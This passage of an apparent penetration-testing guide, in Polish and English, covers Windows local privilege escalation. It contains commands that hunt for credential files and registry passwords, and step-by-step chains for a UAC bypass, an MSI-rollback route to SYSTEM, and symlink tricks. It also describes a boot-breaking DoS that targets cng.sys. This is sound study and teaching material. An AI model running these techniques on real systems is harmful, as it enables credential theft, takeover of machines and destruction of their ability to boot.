dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credentials in the RecycleBin

Powinieneś także sprawdzić Bin, czy nie znajdują się w nim poświadczenia

Aby **odzyskać hasła** zapisane przez kilka programów, możesz użyć: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### W rejestrze

**Inne możliwe klucze rejestru zawierające poświadczenia**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia przeglądarek

Należy sprawdzić bazy danych (dbs), w których przechowywane są hasła z **Chrome or Firefox**.\
Sprawdź też historię, zakładki i ulubione przeglądarek — być może jakieś **hasła** są tam przechowywane.

Narzędzia do wyciągania haseł z przeglądarek:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

Component Object Model (COM) is a technology built within the Windows operating system that allows **intercommunication** between software components of different languages. Each COM component is **identified via a class ID (CLSID)** and each component exposes functionality via one or more interfaces, identified via interface IDs (IIDs).

COM classes and interfaces are defined in the registry under **HKEY\CLASSES\ROOT\CLSID** and **HKEY\CLASSES\ROOT\Interface** respectively. This registry is created by merging the **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (jednowątkowy), **Free** (wielowątkowy), **Both** (jednowątkowy lub wielowątkowy) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

W praktyce, jeśli uda ci się **nadpisać którąkolwiek z DLL**, które zostaną wykonane, możesz **escalate privileges**, jeśli ta DLL zostanie uruchomiona przez innego użytkownika.

Aby dowiedzieć się, jak atakujący wykorzystują COM Hijacking jako mechanizm persistence, sprawdź:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Ogólne wyszukiwanie haseł w plikach i rejestrze**

**Szukaj zawartości plików**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Wyszukaj plik o określonej nazwie**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Przeszukaj rejestr w poszukiwaniu nazw kluczy i haseł**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Narzędzia wyszukujące hasła

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **jest wtyczką msf** — stworzyłem ją, aby **automatycznie uruchamiać wszystkie metasploit POST module, które wyszukują credentials** w systemie ofiary.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatycznie wyszukuje wszystkie pliki zawierające hasła wymienione na tej stronie.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) jest kolejnym świetnym narzędziem do wydobywania haseł z systemu.

Narzędzie [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) wyszukuje **sessions**, **usernames** i **passwords** kilku programów, które zapisują te dane w jawnej postaci (PuTTY, WinSCP, FileZilla, SuperPuTTY i RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Wyobraź sobie, że **a process running as SYSTEM open a new process** (`OpenProcess()`) z **pełnym dostępem**. Ten sam proces **also create a new process** (`CreateProcess()`) **z niskimi uprawnieniami, ale dziedziczący wszystkie otwarte handlery głównego procesu**.\
Jeśli masz **pełny dostęp do procesu o niskich uprawnieniach**, możesz przejąć **otwarty handle do uprzywilejowanego procesu utworzonego** przez `OpenProcess()` i **wstrzyknąć shellcode**.\
[Przeczytaj ten przykład, aby uzyskać więcej informacji o **tym, jak wykrywać i wykorzystywać tę podatność**.](leaked-handle-exploitation.md)\
[Przeczytaj ten **inny wpis dla pełniejszego wyjaśnienia, jak testować i nadużywać więcej otwartych handlerów procesów i wątków dziedziczonych z różnymi poziomami uprawnień (nie tylko pełnym dostępem)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Segmenty pamięci współdzielonej, określane jako **pipes**, umożliwiają komunikację między procesami i transfer danych.

Windows dostarcza funkcję nazwaną **Named Pipes**, pozwalającą niepowiązanym procesom na wymianę danych, nawet przez różne sieci. Przypomina to architekturę klient/serwer, z rolami określonymi jako **named pipe server** i **named pipe client**.

Gdy dane są wysyłane przez **client** przez pipe, **server**, który utworzył pipe, ma możliwość **przyjęcia tożsamości** **clienta**, o ile posiada niezbędne prawa **SeImpersonate**. Zlokalizowanie **uprzywilejowanego procesu**, który komunikuje się za pomocą pipe, które możesz podszyć, daje możliwość **uzyskania wyższych uprawnień** przez przyjęcie tożsamości tego procesu, gdy wejdzie w interakcję z pipe, które utworzyłeś. Instrukcje wykonania takiego ataku znajdziesz [**tutaj**](named-pipe-client-impersonation.md) i [**tutaj**](#from-high-integrity-to-system).

Ponadto poniższe narzędzie pozwala **przechwycić komunikację named pipe za pomocą narzędzia takiego jak burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **a to narzędzie pozwala wypisać i zobaczyć wszystkie pipes, aby znaleźć privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

The Telephony service (TapiSrv) in server mode exposes `\\pipe\\tapsrv` (MS-TRP). A remote authenticated client can abuse the mailslot-based async event path to turn `ClientAttach` into an arbitrary **4-byte write** to any existing file writable by `NETWORK SERVICE`, then gain Telephony admin rights and load an arbitrary DLL as the service. Full flow:

- `ClientAttach` with `pszDomainUser` set to a writable existing path → the service opens it via `CreateFileW(..., OPEN_EXISTING)` and uses it for async event writes.
- Each event writes the attacker-controlled `InitContext` from `Initialize` to that handle. Register a line app with `LRegisterRequestRecipient` (`Req_Func 61`), trigger `TRequestMakeCall` (`Req_Func 121`), fetch via `GetAsyncEvents` (`Req_Func 0`), then unregister/shutdown to repeat deterministic writes.
- Add yourself to `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, reconnect, then call `GetUIDllName` with an arbitrary DLL path to execute `TSPI_providerUIIdentify` as `NETWORK SERVICE`.

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Różne

### Rozszerzenia plików, które mogą uruchamiać kod w Windows

Zobacz stronę **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Klikalne linki Markdown przekazywane do `ShellExecuteExW` mogą wywołać niebezpieczne handler'y URI (`file:`, `ms-appinstaller:` lub dowolny zarejestrowany scheme) i uruchomić pliki kontrolowane przez atakującego jako bieżący użytkownik. Zobacz:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitorowanie linii poleceń w poszukiwaniu haseł**

Po uzyskaniu shella jako użytkownik mogą istnieć zadania zaplanowane lub inne procesy, które są uruchamiane i **przekazują poświadczenia w linii poleceń**. Poniższy skrypt przechwytuje linie poleceń procesów co dwie sekundy i porównuje bieżący stan z poprzednim, wypisując wszelkie różnice.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Stealing passwords from processes

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Jeśli masz dostęp do interfejsu graficznego (przez konsolę lub RDP) i UAC jest włączony, w niektórych wersjach Microsoft Windows możliwe jest uruchomienie terminala lub innego procesu takiego jak "NT\AUTHORITY SYSTEM" z poziomu nieuprzywilejowanego użytkownika.

To umożliwia eskalację uprawnień i jednoczesne obejście UAC przy użyciu tej samej luki. Dodatkowo nie ma potrzeby instalowania czegokolwiek, a używany w trakcie procesu plik binarny jest podpisany i wydany przez Microsoft.

Niektóre z dotkniętych systemów to:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Aby wykorzystać tę podatność, należy wykonać następujące kroki:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## From Administrator Medium to High Integrity Level / UAC Bypass

Przeczytaj to, aby dowiedzieć się o Integrity Levels:


{{#ref}}
integrity-levels.md
{{#endref}}

Następnie przeczytaj to, aby dowiedzieć się o UAC i UAC bypasses:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

Technika opisana [**w tym wpisie na blogu**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) z kodem exploita [**dostępnym tutaj**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Atak zasadniczo polega na wykorzystaniu funkcji rollback Windows Installer do zastąpienia legalnych plików złośliwymi podczas procesu odinstalowywania. W tym celu atakujący musi stworzyć **złośliwy MSI installer**, który będzie użyty do przejęcia folderu `C:\Config.Msi`, który następnie zostanie użyty przez Windows Installer do przechowywania plików rollback podczas odinstalowywania innych pakietów MSI — gdzie pliki rollback zostałyby zmodyfikowane, aby zawierać złośliwy payload.

Zreasumowana technika wygląda następująco:

1. **Stage 1 – Przygotowanie do Hijacka (zostaw `C:\Config.Msi` pusty)**

- Step 1: Install the MSI
- Stwórz `.msi`, który instaluje nieszkodliwy plik (np. `dummy.txt`) w zapisywalnym folderze (`TARGETDIR`).
- Oznacz installer jako **"UAC Compliant"**, tak aby **nie-admin** mógł go uruchomić.
- Zachowaj **uchwyt** do pliku otwarty po instalacji.

- Step 2: Begin Uninstall
- Odinstaluj ten sam `.msi`.
- Proces odinstalowywania zaczyna przenosić pliki do `C:\Config.Msi` i zmieniać ich nazwy na `.rbf` (rollback backups).
- **Poll the open file handle** używając `GetFinalPathNameByHandle`, aby wykryć kiedy plik stanie się `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- `.msi` zawiera **custom uninstall action (`SyncOnRbfWritten`)**, która:
- Sygnałuje kiedy `.rbf` został zapisany.
- Następnie **czeka** na inny event zanim kontynuuje odinstalowywanie.

- Step 4: Block Deletion of `.rbf`
- Gdy otrzymasz sygnał, **otwórz plik `.rbf`** bez `FILE_SHARE_DELETE` — to **zapobiega jego usunięciu**.
- Potem **odsygnaluj**, aby odinstalowywanie mogło się dokończyć.
- Windows Installer nie jest w stanie usunąć `.rbf`, i ponieważ nie może usunąć całej zawartości, **`C:\Config.Msi` nie zostaje usunięty**.

- Step 5: Manually Delete `.rbf`
- Ty (atakujący) ręcznie usuwasz plik `.rbf`.
- Teraz **`C:\Config.Msi` jest pusty**, gotowy do przejęcia.

> W tym momencie, **uruchom lukę pozwalającą na arbitralne usuwanie folderów na poziomie SYSTEM**, aby usunąć `C:\Config.Msi`.

2. **Stage 2 – Zastąpienie rollback scripts złośliwymi**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Odtwórz folder `C:\Config.Msi` samodzielnie.
- Ustaw **słabe DACLs** (np. Everyone:F), i **utrzymaj uchwyt otwarty** z `WRITE_DAC`.

- Step 7: Run Another Install
- Zainstaluj `.msi` ponownie, z:
- `TARGETDIR`: lokalizacja zapisywalna.
- `ERROROUT`: zmienna, która wywołuje celowe niepowodzenie.
- Ta instalacja będzie użyta do ponownego wywołania **rollback**, który czyta `.rbs` i `.rbf`.

- Step 8: Monitor for `.rbs`
- Użyj `ReadDirectoryChangesW`, aby monitorować `C:\Config.Msi` aż pojawi się nowe `.rbs`.
- Przechwyć jego nazwę pliku.

- Step 9: Sync Before Rollback
- `.msi` zawiera **custom install action (`SyncBeforeRollback`)**, która:
- Sygnałuje event kiedy `.rbs` zostanie utworzone.
- Następnie **czeka** zanim będzie kontynuować.

- Step 10: Reapply Weak ACL
- Po otrzymaniu eventu `rbs created`:
- Windows Installer **ponownie aplikuje silne ACL** do `C:\Config.Msi`.
- Ale ponieważ nadal masz uchwyt z `WRITE_DAC`, możesz **ponownie nałożyć słabe ACL**.

> ACLs są **egzekwowane tylko przy otwieraniu uchwytu**, więc nadal możesz pisać do folderu.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Nadpisz plik `.rbs` fałszywym rollback scriptem, który każe Windows:
- Przywrócić twój `.rbf` (złośliwy DLL) do **uprzywilejowanej lokalizacji** (np. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Upuścić fałszywe `.rbf` zawierające **złośliwy DLL z payloadem SYSTEM**.

- Step 12: Trigger the Rollback
- Zasygnalizuj event synchronizacji, aby installer wznowił działanie.
- A **type 19 custom action (`ErrorOut`)** jest skonfigurowana, aby **celowo spowodować awarię instalacji** w znanym punkcie.
- To powoduje rozpoczęcie **rollbacku**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Czyta twój złośliwy `.rbs`.
- Kopiuje twój `.rbf` DLL do docelowej lokalizacji.
- Masz teraz **złośliwy DLL w ścieżce ładowanej przez SYSTEM**.

- Final Step: Execute SYSTEM Code
- Uruchom zaufany **auto-elevated binary** (np. `osk.exe`), który załaduje DLL, który przejąłeś.
- **Boom**: Twój kod zostaje wykonany **jako SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

Główna technika MSI rollback (poprzednia) zakłada, że możesz usunąć **cały folder** (np. `C:\Config.Msi`). Ale co jeśli twoja luka pozwala tylko na **arbitralne usuwanie plików**?

Możesz wykorzystać **wewnętrzne mechanizmy NTFS**: każdy folder ma ukryty alternatywny strumień danych zwany:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Ten strumień przechowuje **metadane indeksu** folderu.

Zatem, jeśli **usuniesz strumień `::$INDEX_ALLOCATION`** należący do folderu, NTFS **usuwa cały folder** z systemu plików.

Możesz to zrobić za pomocą standardowych API usuwania plików, takich jak:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Mimo że wywołujesz *file* delete API, to **usuwa sam folder**.

### From Folder Contents Delete to SYSTEM EoP
Co jeśli twoje primitive nie pozwala na usuwanie dowolnych plików/folderów, ale **pozwala na usunięcie *zawartości* folderu kontrolowanego przez atakującego**?

1. Krok 1: Przygotuj folder i plik-przynętę
- Create: `C:\temp\folder1`
- Inside it: `C:\temp\folder1\file1.txt`

2. Krok 2: Załóż **oplock** na `file1.txt`
- Oplock **wstrzymuje wykonanie**, gdy uprzywilejowany proces próbuje usunąć `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Krok 3: Wywołaj proces SYSTEM (np. `SilentCleanup`)
- Ten proces skanuje foldery (np. `%TEMP%`) i próbuje usunąć ich zawartość.
- Gdy napotka `file1.txt`, **oplock triggers** i przekazuje kontrolę do twojego callbacka.

4. Krok 4: Wewnątrz oplock callback – przekieruj usuwanie

- Opcja A: Przenieś `file1.txt` gdzie indziej
- To opróżnia `folder1` bez naruszenia oplocka.
- Nie usuwaj `file1.txt` bezpośrednio — to przedwcześnie zwolni oplock.

- Opcja B: Konwertuj `folder1` na **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Opcja C: Utwórz **symlink** w `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> To celuje w wewnętrzny strumień NTFS, który przechowuje metadane folderu — jego usunięcie powoduje usunięcie folderu.

5. Krok 5: Zwolnienie oplock
- Proces SYSTEM kontynuuje i próbuje usunąć `file1.txt`.
- Ale teraz, z powodu junction + symlink, tak naprawdę usuwa:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Wynik**: `C:\Config.Msi` zostaje usunięty przez SYSTEM.

### Od utworzenia dowolnego katalogu do trwałego DoS

Wykorzystaj prymityw pozwalający **utworzyć dowolny katalog jako SYSTEM/admin** — nawet jeśli **nie możesz zapisywać plików** ani **ustawiać słabych uprawnień**.

Utwórz **katalog** (nie plik) o nazwie **krytycznego sterownika Windows**, np.:
```
C:\Windows\System32\cng.sys
```
- Ta ścieżka zwykle odpowiada sterownikowi w trybie jądra `cng.sys`.
- Jeśli **wstępnie utworzysz tę ścieżkę jako folder**, Windows nie załaduje właściwego sterownika podczas rozruchu.
- Następnie Windows próbuje załadować `cng.sys` podczas rozruchu.
- Widzi folder, **nie znajduje właściwego sterownika**, i **zawiesza się lub przerywa rozruch**.
- Nie ma **żadnego trybu zapasowego**, i **nie można odzyskać** systemu bez ingerencji zewnętrznej (np. naprawa rozruchu lub dostęp do dysku).

### From privileged log/backup paths + OM symlinks to arbitrary file overwrite / boot DoS

Kiedy **uprzywilejowana usługa** zapisuje logi/eksporty do ścieżki odczytanej z **zapisywalnej konfiguracji**, przekieruj tę ścieżkę za pomocą **Object Manager symlinks + NTFS mount points**, aby zamienić uprzywilejowany zapis w dowolne nadpisanie pliku (nawet **bez** SeCreateSymbolicLinkPrivilege).

**Wymagania**
- Plik konfiguracyjny przechowujący docelową ścieżkę jest zapisywalny przez atakującego (np. `%ProgramData%\...\.ini`).
- Możliwość utworzenia mount pointu do `\RPC Control` oraz OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Uprzywilejowana operacja, która zapisuje do tej ścieżki (log, export, report).

**Przykładowy łańcuch**
1. Odczytaj konfigurację, aby odzyskać docelową lokalizację logów uprzywilejowanych, np. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` w `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Przekieruj ścieżkę bez uprawnień administratora:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Poczekaj, aż uprzywilejowany komponent zapisze log (np. administrator wyzwala "send test SMS"). Zapis teraz trafia do `C:\Windows\System32\cng.sys`.
4. Zbadaj nadpisany cel (parser hex/PE), aby potwierdzić uszkodzenie; restart wymusza, by Windows załadował podmienioną ścieżkę sterownika → **boot loop DoS**. To również uogólnia się na każdy chroniony plik, który uprzywilejowana usługa otworzy do zapisu.

> `cng.sys` jest zwykle ładowany z `C:\Windows\System32\drivers\cng.sys`, ale jeśli kopia istnieje w `C:\Windows\System32\cng.sys`, system może spróbować jej najpierw, co czyni ją niezawodnym celem DoS dla uszkodzonych danych.



## **Z High Integrity do System**

### **Nowa usługa**

Jeśli już działasz w procesie High Integrity, **ścieżka do SYSTEM** może być prosta — wystarczy **utworzyć i uruchomić nową usługę**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Podczas tworzenia service binary upewnij się, że to prawidłowa usługa lub że plik binarny wykonuje niezbędne czynności, by się uruchomić, ponieważ w przeciwnym razie zostanie zabity po 20s, jeśli nie jest prawidłową usługą.

### AlwaysInstallElevated

Z procesu o High Integrity możesz spróbować **włączyć wpisy rejestru AlwaysInstallElevated** i **zainstalować** reverse shell używając opakowania _**.msi**_.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**You can** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Jeśli masz te uprawnienia tokena (prawdopodobnie znajdziesz je w już działającym procesie o High Integrity), będziesz w stanie **otworzyć niemal dowolny proces** (niechronione procesy) z uprawnieniem SeDebug, **skopiować token** procesu i utworzyć **dowolny proces z tym tokenem**.\
Zwykle przy tej technice wybiera się **proces uruchomiony jako SYSTEM z wszystkimi uprawnieniami tokena** (_tak, można znaleźć procesy SYSTEM bez wszystkich uprawnień tokena_).\
**You can find an** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Technika ta jest używana przez meterpreter do eskalacji w `getsystem`. Polega na **utworzeniu pipe i następnie utworzeniu/wykorzystaniu usługi do zapisu do tego pipe**. Następnie **server**, który utworzył pipe używając uprawnienia **`SeImpersonate`**, będzie w stanie **podszyć się pod token** klienta pipe (usługi), uzyskując uprawnienia SYSTEM.\
If you want to [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
If you want to read an example of [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Jeśli uda ci się **hijack a dll** ładowaną przez **proces** działający jako **SYSTEM**, będziesz w stanie uruchomić dowolny kod z tymi uprawnieniami. Dlatego Dll Hijacking jest również przydatny do tego typu eskalacji uprawnień, a ponadto jest znacznie **łatwiejszy do osiągnięcia z procesu o high integrity**, ponieważ będzie on miał **uprawnienia do zapisu** w folderach używanych do ładowania dlli.\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Więcej pomocy

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Przydatne narzędzia

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Sprawdza misconfigurations i wrażliwe pliki (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Sprawdza możliwe misconfigurations i zbiera info (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Sprawdza misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Ekstraktuje zapisane sesje PuTTY, WinSCP, SuperPuTTY, FileZilla i RDP. Użyj -Thorough lokalnie.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Ekstrahuje credentials z Credential Manager. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Rozprowadza zebrane hasła po domenie**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh to PowerShell ADIDNS/LLMNR/mDNS spoofer i narzędzie man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Podstawowa enumeracja Windows pod kątem privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Szuka znanych privesc podatności (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokalne kontrole **(Wymaga praw Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Szuka znanych privesc podatności (wymaga skompilowania za pomocą VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumeruje hosta szukając misconfigurations (bardziej narzędzie do zbierania informacji niż privesc) (wymaga skompilowania) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Ekstrahuje credentials z wielu programów (precompiled exe na githubie)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port PowerUp do C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Sprawdza misconfiguration (wykonywalny precompiled na githubie). Niezalecane. Nie działa dobrze na Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Sprawdza możliwe misconfigurations (exe z pythona). Niezalecane. Nie działa dobrze na Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Narzędzie stworzone na podstawie tego postu (nie wymaga accesschk do poprawnego działania, ale może go używać).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Odczytuje wynik **systeminfo** i rekomenduje działające exploity (lokalny python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Odczytuje wynik **systeminfo** i rekomenduje działające exploity (lokalny python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Musisz skompilować projekt używając odpowiedniej wersji .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Aby zobaczyć zainstalowaną wersję .NET na hoście ofiary możesz zrobić:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Źródła

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
